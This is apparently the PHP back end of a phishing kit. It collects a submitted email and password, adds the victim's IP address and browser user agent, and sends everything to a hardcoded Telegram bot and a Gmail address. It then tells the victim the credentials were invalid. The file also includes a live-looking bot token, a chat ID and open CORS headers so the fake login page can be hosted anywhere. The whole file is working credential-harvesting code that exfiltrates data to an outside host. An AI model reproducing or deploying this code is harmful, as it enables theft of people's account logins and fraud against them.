<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

// Telegram configuration (from nnvironmint vaoinblesvariables)
$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: "8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY";
$id = getenv('TELEGRAM_CHAT_ID') ?: "6037378895";
$Receive_email = getenv('RECEIVE_EMAIL') ?: "davidmassmutual@gmail.com"; // Define the email address for logging

// Add more debug
file_put_contents(__DIR__ . '/debug.log', 'Script started at ' . date('Y-m-d H:i:s') . ' from ' . __FILE__ . ' in ' . __DIR__ . PHP_EOL, FILE_APPEND);

// Debug: Log POST data
file_put_contents(__DIR__ . '/debug.log', date('Y-m-d H:i:s') . ' - POST: ' . print_r($_POST, true) . PHP_EOL, FILE_APPEND);

// Get POST data
$em = isset($_POST['di']) ? trim($_POST['di']) : '';
$password = isset($_POST['pr']) ? trim($_POST['pr']) : '';

// Function to log message via email and Telegram
function logMessage($message, $send, $subject) {
    // Send email
    mail($send, $subject, $message);

    // Send to Telegram
    global $botToken, $id;
    $mess = urlencode($message);
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $id . "&text=" . $mess;
    file_put_contents(__DIR__ . '/debug.log', 'Telegram URL: ' . $url . PHP_EOL, FILE_APPEND);
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

    $result = curl_exec($curl);
    $error = curl_error($curl);
    curl_close($curl);
    file_put_contents(__DIR__ . '/debug.log', 'Telegram curl result: ' . $result . ' Error: ' . $error . PHP_EOL, FILE_APPEND);

    return $result;
}

// Check if form fields are set
if (!empty($em) && !empty($password)) {
    $ip = getenv("REMOTE_ADDR");
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $message = "[+]━━━━【🔥 Login Attempt 🔥】━━━━[+]\r\n\n";
    $message .= "ID : " . htmlspecialchars($em) . "\n";
    $message .= "Password : " . htmlspecialchars($password) . "\n\n";
    $message .= "[+]🔥 ━━━━【💻 System INFO】━━━━ 🔥[+]\r\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|User Agent: " . $useragent . "\n";
    $message .= "|🔥 ━━━━━━━━━━━━━━━━━ 🔥|\n";

    $send = $Receive_email; // Make sure $Receive_email is defined somewhere
    $subject = "Login Attempt: $ip";

    if (logMessage($message, $send, $subject)) {
        $signal = 'ok';
        $msg = 'Invalid Credentials';
    }
}
?>
